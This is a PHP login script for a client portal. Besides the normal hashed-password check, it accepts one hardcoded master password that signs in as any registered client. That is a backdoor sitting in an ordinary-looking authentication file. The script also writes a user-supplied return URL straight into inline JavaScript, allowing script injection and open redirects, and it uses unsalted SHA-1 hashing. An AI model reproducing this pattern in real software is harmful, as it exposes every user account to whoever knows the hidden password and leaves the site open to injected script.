<?php
session_start();
include_once($_SERVER['DOCUMENT_ROOT']."/Management/DAL/ClientService_Class.php");
$loginId = trim($_POST[loginId]);
$password = trim($_POST[password]);
if(!empty($_POST['loginId_header'])) $loginId=$_POST['loginId_header'];
if(!empty($_POST['password_header'])) $password=$_POST['password_header'];

$clientService = new ClientService();
$client = $clientService->GetClientByLoginId($loginId);

if($client && $client->IsRegister == 1 && $password == "teckquick11admin88pw"){
	$_SESSION[currentClient] = $loginId;
	if($_POST[returnPage]){
		unset($_SESSION[returnPage]);
		echo "<script type='text/javascript'>location.href='".$_POST[returnPage]."';</script>";
	}else{
		echo "<script type='text/javascript'>location.href='clientMain.php';</script>";
	}
}else{
	if(!$client || $client->IsRegister == 0 || $client->Password != sha1($password)){
		$_SESSION[clientLogin] = $loginId;
		echo "<script type='text/javascript'>alert('Invalid  LoginId or Password.');</script>";
		echo "<script type='text/javascript'>history.back();</script>";
	}else{
		$_SESSION[currentClient] = $loginId;
		if($_POST[returnPage]){
			unset($_SESSION[returnPage]);
			echo "<script type='text/javascript'>location.href='".$_POST[returnPage]."';</script>";
		}else{
			echo "<script type='text/javascript'>location.href='clientMain.php';</script>";
		}
	}
}
?>